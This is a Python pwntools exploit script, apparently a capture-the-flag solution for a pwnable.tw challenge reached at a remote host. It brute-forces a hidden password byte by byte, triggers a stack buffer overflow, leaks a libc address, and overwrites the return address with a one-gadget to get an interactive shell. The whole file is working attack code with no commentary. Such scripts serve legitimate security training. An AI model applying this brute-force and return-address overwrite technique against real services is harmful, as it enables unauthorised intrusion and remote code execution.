from pwn import *
#io=process("./back",env={"LD_PRELOAD":"./libc_64.so.6"})
#gdb.attach(io,"b*0x0000555555554FC1")
io=remote("chall.pwnable.tw",10205)


password=""
for i in range(0x10):
    print i
    for j in range(1,256):
        print j
        io.sendlineafter(">> ","1")
        pay=password+p8(j)+"\x00"
        io.recvuntil("Your passowrd :")
        io.send(pay)
        check=io.recv(1)
        if(check=="L"):
            io.sendlineafter(">> ","1")
            io.recvuntil(">> ")
            io.send("a")
            password=password+p8(j)
            break;


payload="a"*63+password+"a"*24
io.sendlineafter(">> ","1")
io.recvuntil("Your passowrd :")
io.send("\x00"+payload)
io.sendlineafter(">> ","3")
io.recvuntil("Copy :")
io.send("b"*47)
io.sendlineafter(">> ","1")
leak=""
prev=password+"1\n"+"a"*22
for i in range(6):
    print i
    for j in range(1,256):
        print j
        io.sendlineafter(">> ","1")
        pay=prev+p8(j)+"\x00"
        io.recvuntil("Your passowrd :")
        io.send(pay)
        check=io.recv(1)
        if(check=="L"):
            io.sendlineafter(">> ","1")
            io.sendlineafter(">> ","")
            prev=prev+p8(j)
            leak=leak+p8(j)
            print j
            break;


libc_base=u64(leak+"\x00\x00")-0x6f7fa
one=libc_base+0xf0567

print hex(one)
payload="1"*63+password+"1"*24+p64(one)
io.sendlineafter(">> ","1")
io.recvuntil("Your passowrd :")
io.send("\x00"+payload)


io.sendlineafter(">> ","3")
io.recvuntil("Copy :")
io.send("b"*47)
#print len(leak)
#io.sendlineafter(">> ","1")
#io.sendlineafter("Your passowrd :",password+"1\n"+"a"*22+"\x62\x00")
io.interactive()
